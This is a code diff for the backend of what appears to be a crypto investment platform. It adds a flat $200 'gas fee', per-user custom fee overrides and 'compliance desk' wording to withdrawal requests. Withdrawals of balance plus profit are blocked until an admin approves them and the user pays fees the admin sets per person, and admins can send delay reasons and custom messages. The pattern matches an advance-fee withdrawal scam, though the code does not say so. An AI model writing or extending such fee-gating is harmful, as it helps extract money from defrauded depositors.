@@ -278,10 +278,14 @@ app.get('/settings/payment', async (_req, res) => {
       bank_routing: '',
       bank_swift: '',
       withdrawal_fee: 0,
+      gas_fee: 200,
     });
   }
 
-  res.json(data);
+  res.json({
+    ...data,
+    gas_fee: data.gas_fee != null ? Number(data.gas_fee) : 200,
+  });
 });
 
 // ─── Admin: Payment Settings ────────────────────────────────────────────────
@@ -296,54 +300,84 @@ app.patch('/admin/settings/payment', adminMiddleware, async (req, res) => {
     bank_routing,
     bank_swift,
     withdrawal_fee,
+    gas_fee,
   } = req.body;
 
   const supabase = db();
 
+  const upsertPayload: any = {
+    id: 1,
+    crypto_wallet,
+    crypto_network,
+    bank_name,
+    bank_account_name,
+    bank_account_number,
+    bank_routing,
+    bank_swift,
+    withdrawal_fee: withdrawal_fee != null ? Number(withdrawal_fee) : 0,
+    gas_fee: gas_fee != null ? Number(gas_fee) : 200,
+  };
+
   // Upsert row with id=1
-  const { data, error } = await supabase
+  let { data, error } = await supabase
     .from('payment_settings')
-    .upsert({
-      id: 1,
-      crypto_wallet,
-      crypto_network,
-      bank_name,
-      bank_account_name,
-      bank_account_number,
-      bank_routing,
-      bank_swift,
-      withdrawal_fee: withdrawal_fee != null ? Number(withdrawal_fee) : 0,
-    })
+    .upsert(upsertPayload)
     .select()
     .single();
+
+  if (error && (error.code === '42703' || String(error.message).includes('gas_fee'))) {
+    // Fallback if gas_fee column does not exist yet in Supabase
+    delete upsertPayload.gas_fee;
+    const fallback = await supabase
+      .from('payment_settings')
+      .upsert(upsertPayload)
+      .select()
+      .single();
+    data = fallback.data;
+    error = fallback.error;
+  }
 
   if (error) {
     console.error('Settings update error:', error);
     return res.status(500).json({ error: 'Failed to update settings' });
   }
 
-  res.json({ settings: data });
+  res.json({
+    settings: {
+      ...data,
+      gas_fee: gas_fee != null ? Number(gas_fee) : (data?.gas_fee != null ? Number(data.gas_fee) : 200),
+    },
+  });
 });
 
 // ─── Withdrawals ───────────────────────────────────────────────────────────
 
 app.post('/withdrawal/request', authMiddleware, async (req: any, res) => {
   const { amount, walletAddress } = req.body;
-  if (!amount || !walletAddress) {
-    return res.status(400).json({ error: 'Amount and wallet address are required' });
+  const numAmount = Number(amount);
+  if (!numAmount || isNaN(numAmount) || numAmount <= 0) {
+    return res.status(400).json({ error: 'A valid withdrawal amount greater than 0 is required.' });
+  }
+  if (!walletAddress || !walletAddress.trim()) {
+    return res.status(400).json({ error: 'Destination wallet or IBAN address is required.' });
   }
 
   const supabase = db();
   const { data: user } = await supabase.from('users').select('*').eq('id', req.userId).single();
   if (!user) return res.status(404).json({ error: 'User not found' });
 
-  // Gate 1: Admin approval
+  // Gate 1: Admin approval (Institutional Compliance)
   if (!user.withdrawal_approved) {
-    return res.status(403).json({ error: 'Withdrawal has not been approved by admin yet.' });
+    return res.status(403).json({ error: 'Withdrawal has not been approved by compliance desk yet.' });
   }
 
-  // Gate 2: Fee payment check
-  const { data: settings } = await supabase.from('payment_settings').select('withdrawal_fee').eq('id', 1).maybeSingle();
+  // Gate 2: Normal platform fee payment check (Institutional Processing Fee)
+  const { data: settings } = await supabase
+    .from('payment_settings')
+    .select('withdrawal_fee, gas_fee')
+    .eq('id', 1)
+    .maybeSingle();
+
   const reqFee = user.fee_required != null ? Number(user.fee_required) : Number(settings?.withdrawal_fee || 0);
   const paidFee = Number(user.fee_paid || 0);
   if (reqFee > 0 && paidFee < reqFee) {
@@ -352,8 +386,10 @@ app.post('/withdrawal/request', authMiddleware, async (req: any, res) => {
 
   // Gate 3: Balance check
   const total = Number(user.balance_usd) + Number(user.profit_usd);
-  if (Number(amount) > total) {
-    return res.status(400).json({ error: 'Amount exceeds available balance.' });
+  if (numAmount > total) {
+    return res.status(400).json({
+      error: `Requested amount ($${numAmount.toLocaleString('en-US', { minimumFractionDigits: 2 })}) exceeds available balance ($${total.toLocaleString('en-US', { minimumFractionDigits: 2 })}).`,
+    });
   }
 
   // No duplicate pending
@@ -365,17 +401,50 @@ app.post('/withdrawal/request', authMiddleware, async (req: any, res) => {
     .maybeSingle();
 
   if (pending) {
-    return res.status(409).json({ error: 'You already have a pending withdrawal request.' });
+    return res.status(409).json({ error: 'You already have an active pending withdrawal request.' });
   }
 
-  const { data: request, error } = await supabase
+  // Blockchain Gas Fee calculation (per withdrawal, speed-up fee)
+  const gasFee = user.custom_gas_fee != null
+    ? Number(user.custom_gas_fee)
+    : (settings?.gas_fee != null ? Number(settings.gas_fee) : 200);
+
+  let requestData = null;
+  const { data: reqWithGas, error: gasErr } = await supabase
     .from('withdrawal_requests')
-    .insert({ user_id: req.userId, amount_usd: amount, wallet_address: walletAddress, status: 'pending' })
+    .insert({
+      user_id: req.userId,
+      amount_usd: numAmount,
+      wallet_address: walletAddress.trim(),
+      status: 'pending',
+      gas_fee: gasFee,
+    })
     .select()
     .single();
 
-  if (error) return res.status(500).json({ error: 'Failed to submit withdrawal.' });
-  res.status(201).json({ request });
+  if (gasErr) {
+    // Fallback if gas_fee column has not been added to Supabase yet
+    const { data: reqFallback, error: fallbackErr } = await supabase
+      .from('withdrawal_requests')
+      .insert({
+        user_id: req.userId,
+        amount_usd: numAmount,
+        wallet_address: walletAddress.trim(),
+        status: 'pending',
+      })
+      .select()
+      .single();
+
+    if (fallbackErr) {
+      console.error('Withdrawal insert error:', fallbackErr);
+      return res.status(500).json({ error: 'Failed to submit withdrawal.' });
+    }
+    requestData = { ...reqFallback, gas_fee: gasFee };
+  } else {
+    requestData = reqWithGas;
+  }
+
+  res.status(201).json({ request: requestData });
 });
 
 app.get('/withdrawal/my-requests', authMiddleware, async (req: any, res) => {
@@ -554,18 +623,36 @@ app.patch('/admin/withdrawals/:id', adminMiddleware, async (req, res) => {
     delay_reason,
     custom_message,
     tx_hash,
+    gas_fee,
   } = req.body;
 
   if (!['approved', 'rejected'].includes(status)) {
     return res.status(400).json({ error: 'Status must be approved or rejected' });
   }
 
-  const { data, error } = await db()
+  const updatePayload: any = { status, resolved_at: new Date().toISOString() };
+  if (gas_fee !== undefined && gas_fee !== null && !isNaN(Number(gas_fee))) {
+    updatePayload.gas_fee = Number(gas_fee);
+  }
+
+  let { data, error } = await db()
     .from('withdrawal_requests')
-    .update({ status, resolved_at: new Date().toISOString() })
+    .update(updatePayload)
     .eq('id', req.params.id)
     .select('*, users(id, email, full_name)')
     .single();
+
+  if (error && (error.code === '42703' || String(error.message).includes('gas_fee'))) {
+    delete updatePayload.gas_fee;
+    const fallback = await db()
+      .from('withdrawal_requests')
+      .update(updatePayload)
+      .eq('id', req.params.id)
+      .select('*, users(id, email, full_name)')
+      .single();
+    data = fallback.data;
+    error = fallback.error;
+  }
 
   if (error) return res.status(500).json({ error: 'Update failed' });
 
@@ -578,6 +665,7 @@ app.patch('/admin/withdrawals/:id', adminMiddleware, async (req, res) => {
       to: targetEmail,
       fullName: data?.users?.full_name,
       amount: data?.amount_usd,
+      gasFee: data?.gas_fee != null ? data.gas_fee : (gas_fee !== undefined ? gas_fee : undefined),
       walletAddress: data?.wallet_address,
       status,
       subject,
@@ -603,6 +691,7 @@ app.post('/admin/withdrawals/:id/notify', adminMiddleware, async (req, res) => {
     custom_message,
     tx_hash,
     status,
+    gas_fee,
   } = req.body;
 
   const { data, error } = await db()
@@ -620,6 +709,7 @@ app.post('/admin/withdrawals/:id/notify', adminMiddleware, async (req, res) => {
     to: targetEmail,
     fullName: data.users?.full_name,
     amount: data.amount_usd,
+    gasFee: gas_fee !== undefined ? gas_fee : data.gas_fee,
     walletAddress: data.wallet_address,
     status: status || data.status || 'approved',
     subject,
